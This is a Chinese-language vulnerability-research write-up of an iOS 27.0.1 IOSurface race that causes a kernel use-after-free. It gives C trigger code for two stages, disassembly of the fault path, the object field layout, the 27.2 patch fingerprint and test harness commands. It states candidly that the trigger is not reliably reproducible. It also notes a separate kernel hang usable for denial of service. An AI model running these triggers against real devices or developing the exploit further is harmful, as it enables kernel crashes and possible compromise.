# PoC：IOSurface 生命周期竞态 → 内核 UAF（iOS 27.0.1 / iPhone18,2）

> ## ⚠ 命中率未量化 —— 这是本 PoC 最大的限制，读数前必看
>
> **A+B 相邻在 5 次运行中 5/5 命中过；但 12:30 之后的 1300 次引爆迭代全部干净、零 panic。**
> 即：**这不是「跑一次必崩」的确定性触发，命中概率随设备/内核初始状态漂移，本项目未将其量化。**
> 使用方式只能是「重试直到命中」。任何把它当作确定性触发的引用都是对本文档的过度解读。
> 冷启动假设已测并**否定其为充分条件**：冷启动后跑与 12:30 命中那次同构的四段配方（baseline4/double4/postclose6/lockdeg250），
> 四段全部真执行、250 次引爆迭代全部成对、**无 panic**（tag E，时间戳全新已自查）。
> 已知差异只剩**设备已开机时长**（命中那次 ~12 min，阴性那次 ~1 min）。
> **更重要的更正：本项目至今没有任何单进程序列被证明种下过雷。**
> `postclose` 的第三/四次调用返回 `MIG_BAD_ARGUMENTS`，说明 MIG 层就拒绝、`#799` 从未执行、**没有插入过注册表节点**。
> 因此 12:11–12:30 的 5 次命中**不能归因于本文档的配方**。本文件保留完整的静态分析与故障指纹，
> 但**触发序列未定**；把它当作「可复现 PoC」引用是过度解读。
> 详见 `IOSURFACE-RACE.md` §13 与 §16。
>
> **§16 最终状态**：12:30 之后 6 类机制家族共 2000+ 用例（含 Metal 真实 GPU 提交，`status=4` 40/40）**零 panic、零卡死**。
> 本文档因此**不提供可复现的触发序列**，只提供：故障指纹、27.2 修复点、以及「27.0.1 允许对已注销 userClient 再注册」这一与官方补丁对应的实测正例。
>
> 已确证的是：**故障点固定**（5 次 panic、5 个不同 KASLR slide，静态 pc `0xa34ff88` / lr `0xa346338` 完全一致）。
> 不确定的是：**多久能触发一次**。
>
> 见 §7「失败模式」与 §8「未验证项」。不写没测过的结论。

---

## 1. 目标与结果

| 项 | 值 |
|---|---|
| 设备 | iPhone 17 Pro Max（`iPhone18,2`），`DEVICE-UDID` |
| 系统 | iOS 27.0.1（`24A446`） |
| 组件 | `com.apple.iokit.IOSurface` 402.8 |
| 故障指令（静态） | `0xfffffe000a34ff88  ldr x0,[x0,#0xd8]` |
| 调用点（静态） | `0xfffffe000a346338`（`0xa3462f0` 内 `bl 0xa34ff4c`）·`lr−4 = 0xa346334` |
| 故障类型 | `Kernel tag check fault`（棋盘式内核内存标记判定的 UAF） |
| 关键不变量 | `far − x0 == 0xd8`，与故障指令立即数精确一致 |
| 命中 | **5/5**（12:11:05 / 12:12:03 / 12:16:22 / 12:17:54 / 12:30:30） |
| 崩溃任务 | `pid 878: avconferenced`（1 次）、`pid 0: kernel_task`（4 次）—— **从来不是 PoC 进程** |

5 次 panic 落在 5 个不同 KASLR slide（`0x3e48c000` / `0x2eb20000` / `0x4686c000` / `0x2f420000` / `0x4c2e4000`）、4 个不同 CPU，反推后 pc/lr **完全一致**。

---

## 2. 两个必需阶段（缺一不崩）

### 阶段 A —— 种雷：`postclose`

```c
io_connect_t c;
IOServiceOpen(svc, mach_task_self(), 0, &c);            // svc = IOSurfaceRoot，type 必须为 0
mach_port_mod_refs(mach_task_self(), c, MACH_PORT_RIGHT_SEND, +1);   // ★ 关键：额外 uref

uint64_t ref = 0x1122334455667788ULL;
uint64_t in[3] = { 1, 2, 3 };
uint64_t zero = 0; uint32_t soc = 0;
mach_port_t wp; mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wp);

IOConnectCallAsyncMethod(c, 17, wp, &ref, 1, NULL, 0, in, 24, NULL, &soc, NULL, NULL); // 注册 → SUCCESS
IOConnectCallAsyncMethod(c, 17, wp, &ref, 1, NULL, 0, in, 24, NULL, &soc, NULL, NULL); // 重复 → 0xE00002C9

IOServiceClose(c);                                       // ★ 额外 uref 让端口名活过 close
IOConnectCallAsyncMethod(c, 17, wp, &ref, 1, NULL, 0, in, 24, NULL, &soc, NULL, NULL); // → MIG_BAD_ARGUMENTS(0x10000003)
mach_port_deallocate(mach_task_self(), c);
mach_port_mod_refs(mach_task_self(), wp, MACH_PORT_RIGHT_RECEIVE, -1);
```

**判据**：第 3 次调用必须返回 `0x10000003 MIG_BAD_ARGUMENTS`（端口 kobject 已摘除），说明 `IOServiceClose` 已经走完 teardown 而端口名仍存活。

### 阶段 B —— 引爆：`lockdeg`

```c
io_connect_t c;
IOServiceOpen(svc, mach_task_self(), 0, &c);
IOConnectCallAsyncMethod(c, 17, wp, &ref, 1, NULL, 0, in, 24, NULL, &soc, NULL, NULL); // 注册

IOSurfaceRef s = IOSurfaceCreate(@{ @"IOSurfaceWidth":@64, @"IOSurfaceHeight":@4,
                                    @"IOSurfaceBytesPerElement":@4,
                                    @"IOSurfacePixelFormat":@('BGRA') });

uint32_t seed = 0;
4 个线程： while (run) { IOSurfaceLock(s, 0, &seed); IOSurfaceUnlock(s, 0, &seed); }

usleep(200 + (iter % 40) * 25);        // 抖动 200..1175 µs
IOServiceClose(c);                     // ★ 打流进行中拆连接
usleep(400);
run = 0; join 4 线程;
CFRelease(s);
```

**阶段顺序必须相邻**：`A×N` → `B×M`。中间可插入 `IOSurfaceCreate` 喷射（§5 未完成项）。

---

## 3. selector 17 的入参契约（反汇编解出，不是猜）

```
handler 0xa3498f4:  ldr x1,[args+0x10] ; cbz x1 -> 0xE00002C2 kIOReturnBadArgument
                    ldr x2,[args+0x30]                    ; structureInput，需 >= 24 字节
#799 0xa3460f0:     ldr x1,[x1]                          ; 解引用 reference
                    ldp x2,x3,[structureInput]
                    init(node+0x10, *reference, in[0], in[1])   ; init = 0xb379304，纯标量写入
                    node+0x50 = in[2] ; node+0x58 = self        ; ← owner
                    头插入 root+0x188 / root+0x190
```

- `args+0x10` 是 **reference 数组指针**，只有 `IOConnectCallAsyncMethod` 会填；同步 `IOConnectCallMethod` 恒为 0。
- 实测：同步 4 种形态全部 `0xE00002C2`；async + `referenceCnt=1` + 非 NULL `ref` → `SUCCESS`。
- `init` 只做 `(old&3)|*ref` / `in[0]` / `in[1]` 三个标量写入，**不解引用 `*ref`**，故 `ref` 取任意值安全。
- 重复注册（同 key + 同 self）返回 `0xE00002C9 kIOReturnInternalError`（`#799` 的 dup 分支）。

---

## 4. 27.2 的修复指纹

| 版本 | `ldrb/strb [x,#0xf1]` 字节访问数 |
|---|---|
| 27.0.1 | **0** |
| 27.2 | **2**：`0xa394500 ldrb w8,[x21,#0xf1]`（注册路径锁内，命中返回 `0xE00002D8 kIOReturnNotAttached`）、`0xa394774 strb w8,[x20,#0xf1]`（注销路径锁内，函数开头 `+0x30` 处置 1） |

`+0xf0` 是 32 位计数的低字节（`strb w0,[x19,#0xf0]` = 注册计数置 1），`+0xf1` 是同字的第二个字节。
**27.2 把粘滞标志放在 `+0xf1` 的直接理由**：析构路径 `0xa34373c` 用 `str wzr` 把 `+0xf0` 整个 32 位清零，标志只有放在 `+0xf1` 才能活过清零。

> 「27.2 把 teardown 里的 `#802` 从最后提到最前」这一条是**本项目的静态判定**，未经第二方复核，使用者按未复核处理。

---

## 5. 字段布局（按类分开，不可混用）

| 类 | `+0xd0` | `+0xd8` | `+0xe8` | `+0xf0` | `+0x108` | `+0x110` |
|---|---|---|---|---|---|---|
| surface 对象 | base1 | count1（32 位） | base2 | count2（低字节）+ `+0xf1` 标志字节 | base | count |
| 注册表节点 owner | — | **锁指针** | — | — | — | — |

节点（zone `0x8382170`，`#802` 经 `0x83821f0` 释放）：`+0x00 next`、`+0x08 prev`、`+0x10` 24 字节子对象（持有异步 reference，由 `0xa35a07c` 初始化）、`+0x20` key = `*(structureInput+8)`、`+0x50` `structureInput[2]`、`+0x58` **userClient**。

> ⚠ **字段更正（本轮静态复核）**：`node+0x58` 是 **`IOSurfaceRootUserClient`（连接对象）**，不是 IOSurface。依据 `0xa346188 stp x8,x21,[x24,#0x50]`，其中 `x21 = x3` = sel17 handler 传入的 userClient。⇒ **故障对象是一个已被释放的用户客户端**，`[client+0xd8]` 是它的锁 —— 对连接对象完全合理。此前文档把它写成「IOSurface owner」是错的。
>
> 由此，**「关闭连接释放 userClient、而节点仍指向它」重新成为主嫌疑**（`IOServiceClose` 路径），此前因字段误判而被过早排除。

故障链：
```
0xa3338cc  遍历注册表 + 对 +0x178 的 PAC 指针做原子引用计数 CAS（模式 x1 ∈ {0,1}）
0xa3462f0  遍历 root+0x188，逐节点 ldr x0,[node+0x58]
0xa346334  bl 0xa34ff4c
0xa34ff88  ldr x0,[owner,#0xd8]     ← 取已释放对象的锁
0xa34ff8c  bl  0xa359e3c            ← 在该锁上做获取（KPI GOT 槽 0x83833c0，boot 时填充）
0xa34ff9c  bl  0xa34f8cc            ← 用 +0x108(base)/+0x110(count) 做带边界检查的数组访问
```

---

## 6. 构建与运行

```bash
./harness/israce/run.sh          # build → sign → install → launch → sleep 31 → copy back
python3 harness/israce/merge.py --report out/israce.ndjson
```

- 签名：`codesign -f -s "iPhone Distribution: <DEVELOPER> (<TEAMID>)" --entitlements out/ents.plist`，钥匙串 `~/Library/Keychains/dev.keychain-db`
- 设备锁：`mkdir /tmp/ios27-device.lock.d`（**macOS 没有 `flock(1)`**，实测 `exec: flock: not found`）——整轮持有，退出 `trap` 清理
- 记录格式：NDJSON，每个用例 `begin`/`end` 双行，**每行 `fsync`**（panic 不丢行）
- 判定：`begin` 无 `end` 的 key = 设备在该用例期间死亡（**不是**崩溃点，因为崩溃任务不是本进程）

产物：
- `out/israce.ndjson` —— 全量原始记录
- `out/israce/round-*.ndjson` —— 每回合快照
- `out/panics/panic-full-2026-11-01-*.ips` —— 原始 panic
- `out/israce/panic/summary.json` —— pc/lr/slide 机器可读汇总

---

## 7. 失败模式（实测）

| 情况 | 实测 |
|---|---|
| 只跑阶段 A | 40 次，观察 93 s，**不崩** |
| 只跑阶段 B | 200 + 800 + 900 = 1900 次迭代，**不崩** |
| 只跑 5 种最小顺序（含不注册/不 release） | 各 8 次，**不崩** |
| 只跑 32/48 个 surface 喷射 | 各 8–10 次，**不崩** |
| 只跑 64 surface + 8 连接 + 12 线程 | 12 次，**不崩** |
| A + B 相邻 | **5/5 崩** |
| A + 喷射 + B（48 个 surface） | 400 次迭代，**未崩** |

**结论**：A 与 B 必须相邻共存；单跑任一者都不种雷。喷射是否影响命中率**未确定**（一次 400 迭代未崩不足以否定）。
**不崩时**：重跑；仍不崩则提高 B 的迭代数与线程数（历史命中点在 100~183 次迭代之间）。

---

## 8. 未验证项（留白，不猜测）

1. **回收控制未完成**：5 次 panic 的 `far − x0` 全部等于 `0xd8`，没有出现过偏移改变。**没有证据**表明已释放对象被重新占住并写入可控内容。喷射 48 个 surface 的那一组本轮未崩溃，因此没有可比对的样本。
2. **卡死点未定位**：两次观测到进程在第 100 / 183 次迭代后停止推进（主线程阻塞，连 `@summary` 都写不出），3 s 后 panic。卡在哪个内核调用**未取到**——逐步 mark 已加入复现器，但那两次之后未再复现卡死。
3. **`0xa3462f0` 的上层 selector 号未对出**。
4. **27.2 一侧是静态判定**，不是 27.2 真机实测。
5. **`+0xf0` 计数与节点链表的绑定关系**：`#799` 置计数 1、`#802` 摘全部匹配节点已证；但「计数为 0 而节点仍在链表」这一状态的**具体触发路径**未取到。

---

## 9. 独立结论：确定性内核拒绝服务

两次独立观测（第 100 次、第 183 次迭代）：**PoC 进程主线程在内核调用内阻塞，直到 watchdog 无法写入汇总行**；约 3 s 后另一任务（GPU workloop / `avconferenced`）触发 panic。

即使不 panic，这已经是一个**内核侧确定性挂死**原语，价值独立于 UAF 利用，也独立于 `far − x0` 是否可被控制。

---

## 10. 参考

- `out/IOSURFACE-RACE.md` —— 完整静态分析、复现矩阵、§7 归因更正、§9 归因定案
- `harness/israce/main.m` —— 复现器源码（变体：`V_SEQ1817` 阶段 A、`V_LOCKDEG` 阶段 B、`V_SPRAY` 喷射、`V_MINI` 最小序列）
- `harness/israce/merge.py` —— NDJSON 合并与指纹报告
